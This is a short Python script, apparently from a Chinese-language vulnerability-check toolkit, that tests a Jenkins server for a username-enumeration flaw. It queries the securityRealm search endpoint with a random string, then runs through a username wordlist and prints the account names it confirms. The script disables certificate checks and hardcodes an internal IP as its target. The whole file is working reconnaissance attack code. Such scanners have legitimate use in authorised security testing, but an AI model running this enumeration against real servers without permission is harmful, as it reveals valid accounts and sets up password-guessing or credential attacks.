#!/usr/bin/env python3

'''
name: Jenkins用户名枚举漏洞
description: Jenkins用户名枚举漏洞
'''

import re
import random
import string
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class Jenkins_Usernumeration_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.headers = {
            "User-Agent":"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"
        }
        self.capta=''
        self.words=''.join((string.ascii_letters,string.digits))
        for i in range(6):
            self.capta = self.capta + random.choice(self.words)

    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        result = ""
        url = self.url + "/securityRealm/user/admin/search/index?q="
        try:
            check_req = requests.get(url + self.capta, headers = self.headers, allow_redirects = False, verify=False)
            if "Search for '%s'" % (self.capta) in check_req.text:
                print('存在Jenkins用户枚举漏洞')
                for user in open('app/username.txt', 'r', encoding = 'utf-8').readlines():
                    user = user.strip()
                    try:
                        result_req = requests.get(url + user, headers = self.headers, verify=False)
                        if 'Jenkins User ID' in result_req.text:
                            print(user)
                    except Exception as e:
                        print(e)
                        pass
                return True
            else:
                print('不存在Jenkins用户枚举漏洞')
                return False
        except Exception as e:
            print(e)
            print('不存在Jenkins用户枚举漏洞')
            return False
        finally:
            pass

if __name__ == '__main__':
    Jenkins_Usernumeration = Jenkins_Usernumeration_BaseVerify('http://10.4.69.55:8789')
    Jenkins_Usernumeration.run()